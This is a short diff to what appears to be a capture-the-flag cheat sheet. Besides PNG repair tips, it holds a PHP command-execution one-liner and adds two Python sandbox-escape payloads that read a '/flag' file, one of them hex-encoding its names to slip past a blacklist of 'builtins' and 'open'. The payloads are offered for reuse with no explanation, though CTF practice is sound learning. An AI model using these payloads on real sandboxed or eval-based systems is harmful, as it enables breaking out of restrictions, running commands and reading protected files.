@@ -48,3 +48,8 @@ pngcheck -qv test.png - Use this command to check for broken png.
 Png repair tool - https://github.com/sherlly/PCRT
 
 Simple one liner - `<?php system("whoami");?>`
+
+Python Sandbox escape - `globals()["__builtins__"].open("/flag").read()`
+
+Escape while builtins and open is blacklisted - `globals().__getitem__(bytes.fromhex(%275f5f6275696c74696e735f5f%27).decode(%27utf-8%27)).__getitem__(bytes.fromhex(%276f70656e%27).decode(%27utf-8%27))(%22/flag%22,%20%22r%22).read()`
+
